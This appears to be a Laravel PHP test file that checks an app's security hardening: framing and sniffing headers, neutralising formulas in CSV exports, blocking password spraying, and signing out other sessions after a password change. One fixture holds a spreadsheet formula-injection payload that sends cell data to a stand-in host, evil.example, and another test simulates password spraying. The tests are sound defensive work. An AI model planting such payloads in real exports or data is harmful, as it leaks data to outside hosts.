<?php

namespace Tests\Feature\Auth;

use App\Models\Rfa;
use App\Models\User;
use App\Support\SpreadsheetSafe;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolePermissionSeeder::class);
    }

    public function test_pages_cannot_be_framed_or_sniffed(): void
    {
        $this->get('/login')
            ->assertOk()
            ->assertHeader('X-Frame-Options', 'SAMEORIGIN')
            ->assertHeader('Content-Security-Policy', "frame-ancestors 'self'")
            ->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    }

    public function test_formula_cells_are_written_as_text(): void
    {
        $this->assertSame("'=HYPERLINK(\"http://x\")", SpreadsheetSafe::cell('=HYPERLINK("http://x")'));
        $this->assertSame("'@SUM(1+1)", SpreadsheetSafe::cell('@SUM(1+1)'));
        $this->assertSame("'+cmd", SpreadsheetSafe::cell('+cmd'));
        $this->assertSame("'-cmd", SpreadsheetSafe::cell('-cmd'));

        $this->assertSame('-1500.50', SpreadsheetSafe::cell('-1500.50'));
        $this->assertSame('Juan Dela Cruz', SpreadsheetSafe::cell('Juan Dela Cruz'));
        $this->assertSame(12, SpreadsheetSafe::cell(12));
        $this->assertNull(SpreadsheetSafe::cell(null));
    }

    public function test_the_report_export_neutralises_formulas_from_case_data(): void
    {
        Rfa::factory()->create([
            'requesting_party' => '=HYPERLINK("http://evil.example/?d="&A2,"Click")',
        ]);

        $csv = $this->actingAs(User::factory()->administrator()->create())
            ->get('/reports/export')
            ->assertOk()
            ->streamedContent();

        $this->assertStringContainsString('"\'=HYPERLINK(', $csv);
        $this->assertStringNotContainsString(',"=HYPERLINK(', $csv);
    }

    public function test_spraying_one_password_across_many_accounts_is_blocked(): void
    {
        $user = User::factory()->administrator()->create([
            'password' => Hash::make('correct-horse-9'),
        ]);

        for ($i = 0; $i < 20; $i++) {
            $this->post('/login', [
                'email' => "nobody{$i}@dole5.gov.ph",
                'password' => 'Welcome2026',
            ]);
        }

        // Even the right password is refused from this address for now.
        $this->post('/login', [
            'email' => $user->email,
            'password' => 'correct-horse-9',
        ])->assertSessionHasErrors(['email' => 'Too many failed sign-in attempts from this network. Try again in 15 minutes.']);

        $this->assertGuest();
    }

    public function test_successful_sign_ins_from_one_address_are_never_blocked(): void
    {
        $users = User::factory()->count(25)->withRole('seado')->create([
            'password' => Hash::make('correct-horse-9'),
        ]);

        foreach ($users as $user) {
            $this->post('/login', [
                'email' => $user->email,
                'password' => 'correct-horse-9',
            ])->assertSessionHasNoErrors();

            $this->post('/logout');
        }
    }

    public function test_a_password_change_signs_out_other_sessions(): void
    {
        $user = User::factory()->administrator()->create([
            'password' => Hash::make('correct-horse-9'),
        ]);

        $this->post('/login', [
            'email' => $user->email,
            'password' => 'correct-horse-9',
        ]);

        $this->assertAuthenticatedAs($user);

        // Changed from another device.
        $user->forceFill(['password' => 'brand-new-pass-7'])->save();

        // A new request loads the user afresh, as a real one would.
        $this->app['auth']->forgetGuards();

        $this->get('/dashboard')->assertRedirect('/login');

        $this->assertGuest();
    }

    public function test_changing_your_own_password_keeps_you_signed_in(): void
    {
        $user = User::factory()->administrator()->create([
            'password' => Hash::make('correct-horse-9'),
        ]);

        $this->post('/login', [
            'email' => $user->email,
            'password' => 'correct-horse-9',
        ]);

        $this->put('/account/password', [
            'current_password' => 'correct-horse-9',
            'password' => 'brand-new-pass-7',
            'password_confirmation' => 'brand-new-pass-7',
        ])->assertSessionHasNoErrors();

        $this->get('/dashboard')->assertOk();

        $this->assertAuthenticatedAs($user);
    }
}
